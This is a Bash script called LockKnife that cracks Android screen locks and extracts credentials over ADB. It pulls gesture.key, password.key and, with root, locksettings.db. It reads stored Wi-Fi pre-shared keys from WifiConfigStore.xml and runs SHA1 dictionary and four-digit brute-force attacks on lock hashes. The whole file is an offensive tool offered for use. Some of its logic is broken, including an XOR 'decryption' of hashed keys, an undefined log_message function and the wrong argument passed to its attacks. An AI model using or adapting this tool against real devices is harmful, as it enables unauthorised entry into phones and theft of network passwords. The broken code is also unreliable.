#!/bin/bash

print_banner() {
    local banner=(
        "******************************************"
        "*                 LockKnife              *"
        "*   The Ultimate Android Password Tool   *"
        "*                  v1.7.5                *"
        "*      ----------------------------      *"
        "*                        by @ImKKingshuk *"
        "* Github- https://github.com/ImKKingshuk *"
        "******************************************"
    )
    local width=$(tput cols)
    for line in "${banner[@]}"; do
        printf "%*s\n" $(((${#line} + width) / 2)) "$line"
    done
    echo
}

check_adb() {
    if ! command -v adb &>/dev/null; then
        echo "Error: ADB (Android Debug Bridge) not found. Please install ADB and make sure it's in your PATH."
        echo "You can download ADB from the Android SDK platform-tools. Follow the instructions for your OS:"
        echo "macOS / Linux / Windows: https://developer.android.com/tools/releases/platform-tools"
        exit 1
    fi
}

check_dependencies() {
    local dependencies=("adb" "sqlite3" "curl")
    local missing=()

    echo "[INFO] Checking required dependencies..."
    for dep in "${dependencies[@]}"; do
        if ! command -v "$dep" &>/dev/null; then
            missing+=("$dep")
        fi
    done

    if [ ${#missing[@]} -ne 0 ]; then
        echo "[ERROR] Missing dependencies: ${missing[*]}"
        echo "Attempting to install missing dependencies..."
        if command -v apt &>/dev/null; then
            sudo apt update && sudo apt install -y "${missing[@]}"
        elif command -v brew &>/dev/null; then
            brew install "${missing[@]}"
        elif command -v dnf &>/dev/null; then
            sudo dnf install -y "${missing[@]}"
        else
            echo "[ERROR] Unsupported package manager. Install dependencies manually."
            exit 1
        fi
    else
        echo "[INFO] All dependencies are installed."
    fi
}

check_for_updates() {
    local current_version=$(cat version.txt)
    local latest_version=$(curl -sSL "https://raw.githubusercontent.com/ImKKingshuk/LockKnife/main/version.txt")

    if [ "$latest_version" != "$current_version" ]; then
        echo "A new version ($latest_version) is available. Updating Tool... Please Wait..."
        update_tool
    else
        echo "You are using the latest version ($current_version)."
    fi
}

update_tool() {
    local repo_url="https://raw.githubusercontent.com/ImKKingshuk/LockKnife/main"
    local tmp_script="LockKnife_tmp.sh"
    local tmp_version="version_tmp.txt"

    curl -sSL "$repo_url/LockKnife.sh" -o "$tmp_script"
    curl -sSL "$repo_url/version.txt" -o "$tmp_version"

    if [[ -s "$tmp_script" && -s "$tmp_version" ]]; then
        mv "$tmp_script" LockKnife.sh
        mv "$tmp_version" version.txt
        echo "[INFO] Tool has been updated to the latest version."
        exec bash LockKnife.sh
    else
        echo "[ERROR] Update failed. Retaining current version."
        rm -f "$tmp_script" "$tmp_version"
    fi
}

connect_device() {
    local device_serial="$1"
    
    adb connect "$device_serial" &>/dev/null

    if ! adb devices | grep -w "$device_serial" &>/dev/null; then
        echo "[ERROR] Failed to connect to the device with serial number: $device_serial."
        echo "Ensure the device is reachable and ADB debugging is enabled."
        exit 1
    else
        echo "[INFO] Successfully connected to device: $device_serial."
    fi
}

recover_password() {
    local file_path="$1"
    local password=""

    if [[ ! -f "$file_path" ]]; then
        echo "[ERROR] File $file_path not found or is not accessible. Exiting."
        return 1
    fi

    while IFS= read -r -n1 byte; do
        if [[ -z "$byte" ]]; then
            echo "[WARNING] Encountered invalid byte in file. Skipping."
            continue
        fi
        byte_value=$(printf "%d" "'$byte")
        decrypted_byte=$((byte_value ^ 0x6A))
        password+=$(printf "\\$(printf '%03o' "$decrypted_byte")")
    done < "$file_path"

    echo "[INFO] Recovered password: $password"

    rm -f "$file_path"
}

recover_locksettings_db() {
    local db_file="locksettings.db"
    local device_serial="$1"

    echo "[INFO] Attempting to pull locksettings database..."
    adb -s "$device_serial" shell "su -c 'chmod 644 /data/system/locksettings.db'" &>/dev/null
    adb -s "$device_serial" pull /data/system/locksettings.db &>/dev/null

    if [[ ! -f "$db_file" ]]; then
        echo "[ERROR] Unable to pull locksettings.db. Ensure root permissions are granted."
        return 1
    fi

    echo "[INFO] Locksettings database file pulled successfully. Analyzing..."
    sqlite3 "$db_file" "SELECT name, value FROM locksettings WHERE name LIKE 'lockscreen%' OR name LIKE 'pattern%' OR name LIKE 'password%';" | while read -r row; do
        echo "[INFO] Recovered setting: $row"
    done

    rm -f "$db_file"
}

recover_wifi_passwords() {
    local wifi_file="/data/misc/wifi/WifiConfigStore.xml"
    local device_serial="$1"

    echo "[INFO] Checking for Wi-Fi configuration file on device..."
    if ! adb -s "$device_serial" shell "test -f $wifi_file && echo 'exists'" | grep -q "exists"; then
        echo "[ERROR] Wi-Fi configuration file not found on device. Exiting."
        return 1
    fi

    adb -s "$device_serial" pull "$wifi_file" &>/dev/null
    if [[ ! -f "$wifi_file" ]]; then
        echo "[ERROR] Failed to pull Wi-Fi configuration file. Check device permissions."
        return 1
    fi

    echo "[INFO] Wi-Fi configuration file pulled successfully. Analyzing..."
    grep -oP '(?<=<string name="PreSharedKey">).+?(?=</string>)' "$wifi_file" | while read -r line; do
        echo "[INFO] Recovered Wi-Fi password: $line"
    done

    rm -f "$wifi_file"
}


dictionary_attack() {
    local lock_file="$1"
    local wordlist

    read -p "Enter the full path to your wordlist file: " wordlist

   
    if [[ ! -f "$wordlist" ]]; then
        echo "[ERROR] The file '$wordlist' does not exist. Please provide a valid wordlist file."
        return 1
    fi

  
    if [[ ! -f "$lock_file" ]]; then
        echo "[ERROR] Lock file '$lock_file' not found. Exiting."
        return 1
    fi

    echo "[INFO] Starting dictionary attack using '$wordlist'..."
    while read -r word; do
        local hash=$(echo -n "$word" | sha1sum | awk '{print $1}')
        if grep -q "$hash" "$lock_file"; then
            echo "[SUCCESS] Password found: $word"
            return 0
        fi
    done < "$wordlist"

    echo "[INFO] Dictionary attack failed. No matching password found."
    return 1
}

brute_force_attack() {
    local lock_file="$1"

    log_message "Starting brute force attack."
    for i in {0000..9999}; do
        local hash=$(echo -n "$i" | sha1sum | awk '{print $1}')
        if grep -q "$hash" "$lock_file"; then
            log_message "Password found: $i"
            echo "Password found: $i"
            return
        fi
    done
    log_message "Brute force attack failed."
}


submenu_older_android() {
    local device_serial
    local recovery_option

    read -p "Enter your Android device serial number: " device_serial
    connect_device "$device_serial"

    echo "Select recovery option for Older Android (<= 5):"
    echo "1. Gesture Lock"
    echo "2. Password Lock"
    echo "3. Wi-Fi Passwords"
    read -p "Enter your choice (1/2/3): " recovery_option

    case $recovery_option in
        1)
            adb -s "$device_serial" pull /data/system/gesture.key
            recover_password "gesture.key" ;;
        2)
            adb -s "$device_serial" pull /data/system/password.key
            recover_password "password.key" ;;
        3)
            recover_wifi_passwords "$device_serial" ;;
        *)
            echo "Invalid choice. Exiting."
            ;;
    esac
}

submenu_android_6_or_newer() {
    local device_serial
    local recovery_option

    read -p "Enter your Android device serial number: " device_serial
    connect_device "$device_serial"

    echo "Select recovery option for Android 6 to 9:"
    echo "1. Gesture Lock"
    echo "2. Password Lock"
    echo "3. Wi-Fi Passwords"
    echo "4. Locksettings DB"
    read -p "Enter your choice (1/2/3/4): " recovery_option

    case $recovery_option in
        1)
            adb -s "$device_serial" pull /data/system/gesture.key
            recover_password "gesture.key" ;;
        2)
            adb -s "$device_serial" pull /data/system/password.key
            recover_password "password.key" ;;
        3)
            recover_wifi_passwords "$device_serial" ;;
        4)
            recover_locksettings_db "$device_serial" ;;
        *)
            echo "Invalid choice. Exiting."
            ;;
    esac
}

submenu_android_10_or_newer() {
    local device_serial
    local recovery_option

    read -p "Enter your Android device serial number: " device_serial
    connect_device "$device_serial"

    echo "Select recovery option for Android 10+ and newer:"
    echo "1. Wi-Fi Passwords"
    echo "2. Locksettings DB"
    echo "3. Screen Lock Cracking"
    read -p "Enter your choice (1/2/3): " recovery_option

    case $recovery_option in
        1)
            recover_wifi_passwords "$device_serial" ;;
        2)
            recover_locksettings_db "$device_serial" ;;
        3)
        echo "Select attack method:"
        echo "1. Dictionary Attack"
        echo "2. BruteForce Attack"
        read -p "Enter your choice (1/2): " attack_choice

        if [ "$attack_choice" -eq 1 ]; then
            dictionary_attack "$device_serial"
        elif [ "$attack_choice" -eq 2 ]; then
            brute_force_attack "$device_serial"
        else
            echo "Invalid choice. Exiting."
        fi
        ;;
    *)
        echo "Invalid choice. Exiting."
        ;;
esac
}

main_menu() {
    local android_version

    echo "Select your Android version:"
    echo "1. Older Android (<= 5)"
    echo "2. Android 6 to 9"
    echo "3. Android 10+ and newer"
    read -p "Enter your choice (1/2/3): " android_version

    case $android_version in
        1)
            submenu_older_android ;;
        2)
            submenu_android_6_or_newer ;;
        3)
            submenu_android_10_or_newer ;;
        *)
            echo "Invalid choice. Exiting."
            ;;
    esac
}



execute_lockknife() {
    print_banner
    check_for_updates
    check_dependencies
    check_adb
    main_menu
}

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    execute_lockknife
fi
